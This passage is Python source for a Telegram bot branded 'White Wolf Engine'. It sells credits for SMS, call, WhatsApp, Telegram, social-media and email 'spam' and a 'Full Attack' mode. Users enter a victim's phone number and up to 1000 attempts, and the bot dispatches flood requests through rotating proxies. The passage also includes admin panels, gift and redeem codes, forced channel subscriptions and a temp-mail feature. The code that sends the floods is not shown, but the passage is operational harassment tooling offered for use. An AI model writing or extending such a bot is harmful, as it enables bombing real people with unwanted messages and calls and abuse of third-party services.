        try: self.bot.send_message(chat_id, f"⚠️ Email expired:\n`{email}`", parse_mode="Markdown")
        except: pass
        self.db.remove_user(user_id)
    def _check_temp_mail(self, user_id, email, chat_id):
        for msg in self.client.fetch_temp_mail_messages(email):
            msg_id = msg.get("id")
            if msg_id and self.db.register_message(user_id, msg_id):
                try: self.bot.send_message(chat_id, f"📩 **New Message**\n👤 From: {msg.get('from','Unknown')}\n📌 Subject: {msg.get('subject','No subject')}\n📝 Body:\n{msg.get('body_text','')}", parse_mode="Markdown")
                except: pass
    def _check_mail_tm(self, user_id, token, chat_id):
        for msg in self.client.fetch_mail_tm_messages(token):
            msg_id = msg.get("id")
            if msg_id and self.db.register_message(user_id, msg_id):
                try: self.bot.send_message(chat_id, f"📩 **New Message**\n👤 From: {msg.get('from', {}).get('address', 'Unknown')}\n📌 Subject: {msg.get('subject','No subject')}\n📝 Snippet:\n{msg.get('intro','')}", parse_mode="Markdown")
                except: pass

class UI:
    @staticmethod
    def back(): return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_main", style="primary")]])

    @staticmethod
    def main_menu():
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("📱 WhatsApp", callback_data="spam_whatsapp", style="primary"), InlineKeyboardButton("✈️ Telegram", callback_data="spam_telegram", style="primary"), InlineKeyboardButton("📞 Calls", callback_data="spam_calls", style="primary")],
            [InlineKeyboardButton("✉️ SMS", callback_data="spam_sms", style="primary"), InlineKeyboardButton("🌐 Social", callback_data="social_menu", style="primary"), InlineKeyboardButton("💣 Full Attack", callback_data="total_attack", style="danger")],
            [InlineKeyboardButton("📧 Temp Mail", callback_data="tempmail_menu", style="success"), InlineKeyboardButton("🎁 Claim Gift", callback_data="claim_gift", style="success"), InlineKeyboardButton("🏷️ Redeem", callback_data="redeem_menu", style="success")],
            [InlineKeyboardButton("👤 Balance", callback_data="my_balance", style="primary"), InlineKeyboardButton("⚙️ Tools", callback_data="tools_menu", style="primary"), InlineKeyboardButton("👑 Admin", callback_data="admin_panel", style="danger")],
            [InlineKeyboardButton("ℹ️ Info", callback_data="info", style="primary")]
        ])

    @staticmethod
    def social():
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("Facebook", callback_data="spam_facebook", style="primary"), InlineKeyboardButton("Instagram", callback_data="spam_instagram", style="primary")],
            [InlineKeyboardButton("Twitter", callback_data="spam_twitter", style="primary"), InlineKeyboardButton("Snapchat", callback_data="spam_snapchat", style="primary")],
            [InlineKeyboardButton("Email", callback_data="spam_email", style="success"), InlineKeyboardButton("🔙 Back", callback_data="back_main", style="danger")]
        ])

    @staticmethod
    def tempmail():
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("🟢 Random", callback_data="tempmail_random", style="success"), InlineKeyboardButton("🔵 Custom", callback_data="tempmail_custom", style="primary")],
            [InlineKeyboardButton("📋 Status", callback_data="tempmail_status", style="primary"), InlineKeyboardButton("🗑️ Delete", callback_data="tempmail_delete", style="danger")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_main", style="danger")]
        ])

    @staticmethod
    def tools():
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("🔢 Validate", callback_data="tool_validate", style="primary"), InlineKeyboardButton("🌍 Carrier", callback_data="tool_carrier", style="primary")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_main", style="danger")]
        ])

    @staticmethod
    def admin_main():
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("👥 Admins", callback_data="admin_admins", style="primary"), InlineKeyboardButton("📢 Channels", callback_data="admin_channels", style="primary")],
            [InlineKeyboardButton("📡 Broadcast", callback_data="admin_broadcast", style="success"), InlineKeyboardButton("⚙️ Services", callback_data="admin_services", style="primary")],
            [InlineKeyboardButton("🎁 Gifts", callback_data="admin_gift_links", style="success"), InlineKeyboardButton("🏷️ Codes", callback_data="admin_redeem_codes", style="success")],
            [InlineKeyboardButton("🌐 Proxies", callback_data="admin_proxies", style="primary"), InlineKeyboardButton("📊 Stats", callback_data="admin_stats", style="primary")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_main", style="danger")]
        ])

    @staticmethod
    def channels():
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ Add", callback_data="add_channel", style="success"), InlineKeyboardButton("🗑️ Remove", callback_data="remove_channel", style="danger")],
            [InlineKeyboardButton("📋 List", callback_data="list_channels", style="primary"), InlineKeyboardButton("🔙 Back", callback_data="admin_panel", style="danger")]
        ])

    @staticmethod
    def services():
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("📱 WhatsApp", callback_data="toggle_whatsapp", style="primary"), InlineKeyboardButton("✈️ Telegram", callback_data="toggle_telegram", style="primary")],
            [InlineKeyboardButton("📞 Calls", callback_data="toggle_calls", style="primary"), InlineKeyboardButton("✉️ SMS", callback_data="toggle_sms", style="primary")],
            [InlineKeyboardButton("🌐 Facebook", callback_data="toggle_facebook", style="primary"), InlineKeyboardButton("📸 Instagram", callback_data="toggle_instagram", style="primary")],
            [InlineKeyboardButton("🐦 Twitter", callback_data="toggle_twitter", style="primary"), InlineKeyboardButton("👻 Snapchat", callback_data="toggle_snapchat", style="primary")],
            [InlineKeyboardButton("📧 Email", callback_data="toggle_email", style="primary"), InlineKeyboardButton("💣 Full", callback_data="toggle_total_attack", style="danger")],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_panel", style="danger")]
        ])

    @staticmethod
    def proxies():
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("📤 Upload", callback_data="upload_proxies", style="success"), InlineKeyboardButton("📋 Stats", callback_data="proxies_stats", style="primary")],
            [InlineKeyboardButton("🧹 Clear", callback_data="clear_proxies", style="danger"), InlineKeyboardButton("🔙 Back", callback_data="admin_panel", style="danger")]
        ])

    @staticmethod
    def admins():
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ Add", callback_data="add_admin", style="success"), InlineKeyboardButton("🗑️ Remove", callback_data="remove_admin", style="danger")],
            [InlineKeyboardButton("📋 List", callback_data="list_admins", style="primary"), InlineKeyboardButton("🔙 Back", callback_data="admin_panel", style="danger")]
        ])

    @staticmethod
    def broadcast():
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("📝 Text", callback_data="broadcast_text", style="primary"), InlineKeyboardButton("🖼️ Photo", callback_data="broadcast_photo", style="primary")],
            [InlineKeyboardButton("🎥 Video", callback_data="broadcast_video", style="primary"), InlineKeyboardButton("📄 Doc", callback_data="broadcast_document", style="primary")],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_panel", style="danger")]
        ])

    @staticmethod
    def gifts():
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("🎁 Create", callback_data="create_gift_link", style="success"), InlineKeyboardButton("📋 List", callback_data="list_gift_links", style="primary")],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_panel", style="danger")]
        ])

    @staticmethod
    def redeems():
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("🏷️ Create", callback_data="create_redeem_code", style="success"), InlineKeyboardButton("📋 List", callback_data="list_redeem_codes", style="primary")],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_panel", style="danger")]
        ])

class BotHandlers:
    def __init__(self, db: DatabaseManager, proxy_mgr: ProxyManager):
        self.db = db
        self.proxy_mgr = proxy_mgr

    async def check_subscription(self, user_id: int, context) -> bool:
        channels = self.db.get_active_channels()
        if not channels: return True
        for channel_id, _, _ in channels:
            try:
                member = await context.bot.get_chat_member(chat_id=channel_id, user_id=user_id)
                if member.status in ["left", "kicked"]: return False
            except: return False
        return True

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        self.db.add_user(user.id, user.username, user.first_name)

        if not await self.check_subscription(user.id, context):
            channels = self.db.get_active_channels()
            kb = [[InlineKeyboardButton(f"📢 {uname}", url=link, style="primary")] for _, uname, link in channels]
            kb.append([InlineKeyboardButton("✅ Verify", callback_data="check_subscription", style="success")])
            await update.message.reply_text("⚠️ *Subscription Required*\n\nJoin the channels below to access the engine.", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))
            return

        if context.args and context.args[0].startswith("gift_"):
            ok, msg = self.db.process_gift(user.id, context.args[0][5:])
            await update.message.reply_text(msg)
            return

        balance = self.db.get_balance(user.id)
        text = (
            f"╭━━━━━━━━━━━━━━━━━━╮\n"
            f"🐺 White Wolf Engine\n"
            f"╰━━━━━━━━━━━━━━━━━━╯\n\n"
            f"👋 Welcome, {user.first_name}\n\n"
            f"🆔 ID: {user.id}\n"
            f"💰 Balance: {balance} Credits\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📌 Access all premium services via the dashboard below.\n"
            f"🎁 Check the rewards section for exclusive offers.\n"
            f"⚡ High activity unlocks additional perks.\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💎 Status:\n"
            f"✅ Account Active\n"
            f"✅ Subscription Verified\n"
            f"✅ Services Online\n\n"
            f"🔹 Support: @j49_c\n"
            f"🔹 Channel: t.me/bshshshkk\n\n"
            f"Select a module to begin 👇"
        )
        await update.message.reply_text(text, reply_markup=UI.main_menu())

    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        data = query.data
        user_id = query.from_user.id
        chat_id = query.message.chat.id

        if data == "check_subscription":
            if await self.check_subscription(user_id, context):
                await query.edit_message_text("✅ Verified! Welcome to White Wolf Engine.")
                balance = self.db.get_balance(user_id)
                text = f"╭━━━━━━━━━━━━━━━━━━╮\n🐺 White Wolf Engine\n╰━━━━━━━━━━━━━━━━━━╯\n\n👋 Welcome, {query.from_user.first_name}\n\n🆔 ID: {user_id}\n💰 Balance: {balance} Credits\n\nSelect a module 👇"
                await query.message.reply_text(text, reply_markup=UI.main_menu())
            else:
                channels = self.db.get_active_channels()
                kb = [[InlineKeyboardButton(f"📢 {uname}", url=link, style="primary")] for _, uname, link in channels]
                kb.append([InlineKeyboardButton("✅ Verify", callback_data="check_subscription", style="success")])
                await query.edit_message_text("⚠️ Subscription incomplete. Join all channels and verify again.", reply_markup=InlineKeyboardMarkup(kb))
            return

        if data == "back_main":
            context.user_data.pop(STATE_KEY, None)
            context.user_data.pop(TEMP_KEY, None)
            await query.edit_message_text("Main Dashboard:", reply_markup=UI.main_menu())
            return

        if data == "social_menu": await query.edit_message_text("Select Platform:", reply_markup=UI.social()); return
        if data == "tempmail_menu": await query.edit_message_text("📧 Temporary Email:", reply_markup=UI.tempmail()); return
        if data == "tools_menu": await query.edit_message_text("Tools:", reply_markup=UI.tools()); return
        if data == "my_balance": await query.edit_message_text(f"💰 Balance: {self.db.get_balance(user_id)} Credits.", reply_markup=UI.main_menu()); return

        if data == "info":
            await query.edit_message_text(
                "🐺 *White Wolf Enterprise Engine*\n"
                "• Version: 7.0 Ultimate\n"
                "• Developer: الذئب الأبيض @j49_c\n"
                "• Channel: t.me/bshshshkk\n\n"
                "🛠 *Modules:*\n"
                "WhatsApp, Telegram, Voice Calls, SMS, Facebook, Instagram, Twitter, Snapchat, Email, Temp Mail.\n\n"
                "🔒 *Features:*\n"
                "Credit System, Gift Links, Redeem Codes, Forced Subscriptions, Broadcasts, Advanced Proxy Management.\n\n"
                "⚠️ Use responsibly.\n"
                "📞 Support: @j49_c",
                parse_mode="Markdown", reply_markup=UI.main_menu()
            )
            return

        if data == "admin_panel":
            if self.db.is_admin(user_id): await query.edit_message_text("👑 Admin Panel:", reply_markup=UI.admin_main())
            else: await query.edit_message_text("⛔ Unauthorized.", reply_markup=UI.main_menu())
            return

        if data == "claim_gift":
            await query.edit_message_text("Send the gift link URL:")
            context.user_data[STATE_KEY] = "waiting_gift_url"
            return

        if data == "redeem_menu":
            await query.edit_message_text("Send the redeem code:")
            context.user_data[STATE_KEY] = "waiting_redeem_code"
            return

        if data.startswith("admin_"):
            if not self.db.is_admin(user_id): await query.edit_message_text("⛔ Unauthorized."); return
            if data == "admin_admins": await query.edit_message_text("Admins:", reply_markup=UI.admins())
            elif data == "admin_channels": await query.edit_message_text("Channels:", reply_markup=UI.channels())
            elif data == "admin_broadcast": await query.edit_message_text("Broadcast:", reply_markup=UI.broadcast())
            elif data == "admin_services": await query.edit_message_text("Services:", reply_markup=UI.services())
            elif data == "admin_gift_links": await query.edit_message_text("Gifts:", reply_markup=UI.gifts())
            elif data == "admin_redeem_codes": await query.edit_message_text("Codes:", reply_markup=UI.redeems())
            elif data == "admin_proxies": await query.edit_message_text("Proxies:", reply_markup=UI.proxies())
            elif data == "admin_stats":
                stats = self.db.get_stats()
                p_stats = self.proxy_mgr.get_stats()
                text = f"📊 *Bot Statistics*\n👥 Users: {stats['users']}\n📨 Total: {stats['reqs']}\n📆 Today: {stats['today']}\n🌐 Proxies: {p_stats['working']}\n🔒 Channels: {stats['channels']}\n🔄 Usage: {p_stats['total_used']}"
                await query.edit_message_text(text, parse_mode="Markdown", reply_markup=UI.admin_main())
            return

        if data == "create_gift_link":
            if not self.db.is_admin(user_id): return
            context.user_data[STATE_KEY] = "gift_points"
            await query.edit_message_text("Enter points for gift link:", reply_markup=UI.back())
            return

        if data == "list_gift_links":
            if not self.db.is_admin(user_id): return
            rows = self.db.get_recent_gifts()
            text = "🎁 *Gift Links*\n\n" + "".join([f"• `{r[0]}` - {r[1]} pts, {r[3]}/{r[2]}, {'🔴' if datetime.now().isoformat() > r[4] else '🟢'}\n" for r in rows]) if rows else "No links."
            await query.edit_message_text(text, parse_mode="Markdown", reply_markup=UI.gifts())
            return

        if data == "create_redeem_code":
            if not self.db.is_admin(user_id): return
            context.user_data[STATE_KEY] = "redeem_points"
            await query.edit_message_text("Enter points for code:", reply_markup=UI.back())
            return

        if data == "list_redeem_codes":
            if not self.db.is_admin(user_id): return
            rows = self.db.get_recent_redeems()
            text = "🏷️ *Redeem Codes*\n\n" + "".join([f"• `{r[0]}` - {r[1]} pts, {r[3]}/{r[2]}, {'🔴' if datetime.now().isoformat() > r[4] else '🟢'}\n" for r in rows]) if rows else "No codes."
            await query.edit_message_text(text, parse_mode="Markdown", reply_markup=UI.redeems())
            return

        if data.startswith("toggle_"):
            if not self.db.is_admin(user_id): return
            svc = data.split("_")[1]
            cur = self.db.is_service_enabled(svc)
            self.db.toggle_service(svc, not cur)
            await query.edit_message_text(f"✅ {svc} {'enabled' if not cur else 'disabled'}.", reply_markup=UI.services())
            return

        if data == "upload_proxies":
            if not self.db.is_admin(user_id): return
            await query.edit_message_text("📤 Send TXT file with proxies:")
            context.user_data[STATE_KEY] = "waiting_proxy_file"
            return

        if data == "proxies_stats":
            if not self.db.is_admin(user_id): return
            s = self.proxy_mgr.get_stats()
            await query.edit_message_text(f"📊 *Proxies*\n📦 Total: {s['total']}\n🟢 Working: {s['working']}\n🔴 Failed: {s['failed']}\n🔁 Uses: {s['total_used']}", parse_mode="Markdown", reply_markup=UI.proxies())
            return

        if data == "clear_proxies":
            if not self.db.is_admin(user_id): return
            await query.edit_message_text(f"🧹 Cleared {self.proxy_mgr.clear_all()} proxies.", reply_markup=UI.proxies())
            return

        if data.startswith("spam_") or data == "total_attack":
            if not await self.check_subscription(user_id, context):
                await query.edit_message_text("⚠️ Subscription required.", reply_markup=UI.main_menu())
                return
            context.user_data["spam_method"] = data
            await query.edit_message_text("📞 Send target phone (+20123456789):", reply_markup=UI.back())
            context.user_data[STATE_KEY] = "awaiting_phone"
            return

        if data.startswith("tempmail_"):
            if data == "tempmail_random":
                temp_db, temp_client = context.bot_data.get("temp_db"), context.bot_data.get("temp_client")
                if not temp_db: await query.edit_message_text("⚠️ Not ready.", reply_markup=UI.tempmail()); return
                email = f"{Utils.random_string(12)}@{random.choice(temp_client.get_temp_mail_domains())}"
                temp_db.upsert_user(user_id, email, ApiProvider.TEMP_MAIL.value, chat_id)
                await query.edit_message_text(f"✅ Created:\n`{email}`", parse_mode="Markdown", reply_markup=UI.tempmail())
            elif data == "tempmail_custom":
                await query.edit_message_text("Send username (alphanumeric):")
                context.user_data[STATE_KEY] = "awaiting_tempmail_username"
            elif data == "tempmail_status":
                temp_db = context.bot_data.get("temp_db")
                info = temp_db.fetch_user(user_id) if temp_db else None
                if info: await query.edit_message_text(f"📧 Active:\n`{info['email']}`\n⏱️ Expires in {max(0, int(72 - (time.time() - info['created_at']) / 3600))}h.", parse_mode="Markdown", reply_markup=UI.tempmail())
                else: await query.edit_message_text("❌ No active email.", reply_markup=UI.tempmail())
            elif data == "tempmail_delete":
                temp_db = context.bot_data.get("temp_db")
                if temp_db: temp_db.remove_user(user_id)
                await query.edit_message_text("🗑️ Deleted.", reply_markup=UI.tempmail())
            return

    async def text_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        state = context.user_data.get(STATE_KEY)

        if update.message.document and state == "waiting_proxy_file":
            file = await context.bot.get_file(update.message.document.file_id)
            await self.proxy_mgr.process_file(await file.download_as_bytearray(), user_id, context)
            context.user_data.pop(STATE_KEY, None)
            return

        if not update.message.text: return
        text = update.message.text.strip()

        if state == "waiting_gift_url":
            match = re.search(r'start=gift_([a-f0-9]+)', text)
            if match:
                ok, msg = self.db.process_gift(user_id, match.group(1))
                await update.message.reply_text(msg)
            else:
                await update.message.reply_text("❌ Invalid link.")
            context.user_data.pop(STATE_KEY, None)
            return

        if state == "waiting_redeem_code":
            ok, msg = self.db.process_redeem(user_id, text)
            await update.message.reply_text(msg)
            context.user_data.pop(STATE_KEY, None)
            return

        if state == "gift_points":
            try:
                pts = int(text)
                if pts <= 0: raise ValueError
                context.user_data[STATE_KEY] = "gift_max_uses"
                context.user_data[TEMP_KEY] = {"points": pts}
                await update.message.reply_text("Enter max uses:", reply_markup=UI.back())
            except: await update.message.reply_text("❌ Invalid number.", reply_markup=UI.back())
            return

        if state == "gift_max_uses":
            try:
                mu = int(text)
                if mu <= 0: raise ValueError
                context.user_data[STATE_KEY] = "gift_days"
                context.user_data[TEMP_KEY]["max_uses"] = mu
                await update.message.reply_text("Enter expiry days:", reply_markup=UI.back())
            except: await update.message.reply_text("❌ Invalid number.", reply_markup=UI.back())
            return

        if state == "gift_days":
            try:
                days = int(text)
                if days <= 0: raise ValueError
                td = context.user_data[TEMP_KEY]
                code = self.db.create_gift(td["points"], td["max_uses"], days, user_id)
                await update.message.reply_text(f"✅ Created!\n🔗 `t.me/{context.bot.username}?start=gift_{code}`\n🎁 {td['points']} pts\n📊 {td['max_uses']} uses\n⏳ {days} days", parse_mode="Markdown", reply_markup=UI.main_menu())
                context.user_data.pop(STATE_KEY, None); context.user_data.pop(TEMP_KEY, None)
            except: await update.message.reply_text("❌ Invalid number.", reply_markup=UI.back())
            return

        if state == "redeem_points":
            try:
                pts = int(text)
                if pts <= 0: raise ValueError
                context.user_data[STATE_KEY] = "redeem_max_uses"
                context.user_data[TEMP_KEY] = {"points": pts}
                await update.message.reply_text("Enter max uses:", reply_markup=UI.back())
            except: await update.message.reply_text("❌ Invalid number.", reply_markup=UI.back())
            return

        if state == "redeem_max_uses":
            try:
                mu = int(text)
                if mu <= 0: raise ValueError
                context.user_data[STATE_KEY] = "redeem_days"
                context.user_data[TEMP_KEY]["max_uses"] = mu
                await update.message.reply_text("Enter expiry days:", reply_markup=UI.back())
            except: await update.message.reply_text("❌ Invalid number.", reply_markup=UI.back())
            return

        if state == "redeem_days":
            try:
                days = int(text)
                if days <= 0: raise ValueError
                td = context.user_data[TEMP_KEY]
                code = self.db.create_redeem(td["points"], td["max_uses"], days, user_id)
                await update.message.reply_text(f"✅ Created!\n🏷️ `{code}`\n🎁 {td['points']} pts\n📊 {td['max_uses']} uses\n⏳ {days} days", parse_mode="Markdown", reply_markup=UI.main_menu())
                context.user_data.pop(STATE_KEY, None); context.user_data.pop(TEMP_KEY, None)
            except: await update.message.reply_text("❌ Invalid number.", reply_markup=UI.back())
            return

        if state == "awaiting_tempmail_username":
            if not text.isalnum():
                await update.message.reply_text("❌ Alphanumeric only.")
                return
            temp_client = context.bot_data.get("temp_client")
            domains = temp_client.get_mail_tm_domains() if temp_client else []
            if not domains:
                await update.message.reply_text("❌ No domains.")
                return
            kb = [[InlineKeyboardButton(d, callback_data=f"tempmail_domain_{text}_{d}", style="primary")] for d in domains[:10]]
            kb.append([InlineKeyboardButton("🔙 Cancel", callback_data="tempmail_menu", style="danger")])
            await update.message.reply_text("🎯 Choose domain:", reply_markup=InlineKeyboardMarkup(kb))
            context.user_data[STATE_KEY] = "awaiting_tempmail_domain"
            context.user_data[TEMP_KEY] = text
            return

        if state == "awaiting_phone":
            context.user_data["target_phone"] = Utils.format_phone(text)
            await update.message.reply_text("🔢 Send attempts (1-1000):", reply_markup=UI.back())
            context.user_data[STATE_KEY] = "awaiting_count"
            return

        if state == "awaiting_count":
            try:
                count = int(text)
                if count < 1 or count > 1000: raise ValueError
            except:
                await update.message.reply_text("❌ 1-1000 only.", reply_markup=UI.back())
                return

            method = context.user_data.get("spam_method")
            phone = context.user_data.get("target_phone")
            balance = self.db.get_balance(user_id)

            if balance < count:
                await update.message.reply_text(f"⚠️ Insufficient credits. Need {count}, have {balance}.\nContact @j49_c", reply_markup=UI.main_menu())
                context.user_data.pop(STATE_KEY, None)
                return

            self.db.deduct_balance(user_id, count)
            await update.message.reply_text(f"✅ Deducted {count}. Starting...")

            proxy = self.proxy_mgr.get_random()
            funcs = {"spam_whatsapp": SpamServices.whatsapp_abwaab, "spam_telegram": SpamServices.telegram_oauth, "spam_calls": SpamServices.call_telz, "spam_sms": SpamServices.sms_twistmena, "spam_facebook": SpamServices.facebook, "spam_instagram": SpamServices.instagram, "spam_twitter": SpamServices.twitter, "spam_snapchat": SpamServices.snapchat, "spam_email": SpamServices.email, "total_attack": SpamServices.total_attack}

            func = funcs.get(method)
            if not func:
                await update.message.reply_text("❌ Unknown.", reply_markup=UI.main_menu())
                context.user_data.pop(STATE_KEY, None)
                return

            res = await func(phone, count, user_id, context, proxy)
            self.db.log_requests(user_id, count)
            await update.message.reply_text(f"🏁 Finished. Success: {res}/{count}.", reply_markup=UI.main_menu())
            context.user_data.pop(STATE_KEY, None)
            return

        await update.message.reply_text("❌ Use the dashboard.", reply_markup=UI.main_menu())

    async def callback_tempmail_domain(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        data = query.data
        prefix = "tempmail_domain_"
        if data.startswith(prefix):
            remainder = data[len(prefix):]
            parts = remainder.split("_", 1)
            if len(parts) == 2:
                username, domain = parts
                user_id = query.from_user.id
                chat_id = query.message.chat.id
                temp_db, temp_client = context.bot_data.get("temp_db"), context.bot_data.get("temp_client")
                if not temp_db or not temp_client:
                    await query.edit_message_text("⚠️ Not ready.")
                    return
                full = f"{username}@{domain}"
                pwd = Utils.random_string(12)
                token = temp_client.create_mail_tm_account(full, pwd)
                if token:
                    temp_db.upsert_user(user_id, full, ApiProvider.MAIL_TM.value, chat_id, password=pwd, token=token)
                    await query.edit_message_text(f"✅ Created:\n`{full}`", parse_mode="Markdown", reply_markup=UI.tempmail())
                else:
                    await query.edit_message_text("❌ Unavailable.", reply_markup=UI.tempmail())
                context.user_data.pop(STATE_KEY, None)
                context.user_data.pop(TEMP_KEY, None)

def main():
    db = DatabaseManager(DB_PATH)
    proxy_mgr = ProxyManager(db)

    app = Application.builder().token(BOT_TOKEN).build()

    temp_db = TempMailDatabase(DB_PATH)
    temp_client = TempMailClient()
    temp_engine = TempMailPollingEngine(app.bot, temp_db, temp_client)
    temp_engine.start()

    app.bot_data["temp_db"] = temp_db
    app.bot_data["temp_client"] = temp_client

    handlers = BotHandlers(db, proxy_mgr)

    app.add_handler(CommandHandler("start", handlers.start))
    app.add_handler(CallbackQueryHandler(handlers.button_handler))
    app.add_handler(CallbackQueryHandler(handlers.callback_tempmail_domain, pattern="^tempmail_domain_"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handlers.text_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handlers.text_handler))

    logger.info("✅ White Wolf Engine initialized successfully.")
    app.run_polling()

if __name__ == "__main__":
    main() 
